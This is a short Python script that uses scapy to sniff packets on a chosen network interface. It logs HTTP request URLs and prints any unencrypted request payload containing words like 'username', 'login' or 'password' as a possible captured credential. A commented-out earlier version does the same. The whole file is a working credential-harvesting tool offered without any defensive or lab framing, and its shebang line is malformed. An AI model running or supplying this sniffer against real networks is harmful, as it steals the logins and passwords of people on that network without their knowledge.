#!usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_sniffed_packet)


# def process_sniffed_packet(packet):
#     if packet.haslayer(http.HTTPRequest):
#         # print(packet)
#         # print(packet.show())
#         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
#         print("[+]HTTP Request >>> " + url)
#         if packet.haslayer(scapy.Raw):
#             # print(packet[scapy.Raw].load)
#             load = packet[scapy.Raw].load
#             keywords = ["username", "login", "password", "user", "email"]
#             for keyword in keywords:
#                 if keyword in load:
#                     print("\n\n[+] Possible Username and Password >>>>>" + load + "\n\n")
#                     break

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "login", "password", "user", "email"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]HTTP Request >>> " + url)
    login_pass = get_login(packet)
    if login_pass:
        print("\n\n[+] Possible Username and Password >>>>>" + login_pass + "\n\n")

interface = input("interface to Sniff :> ")
sniff(interface)
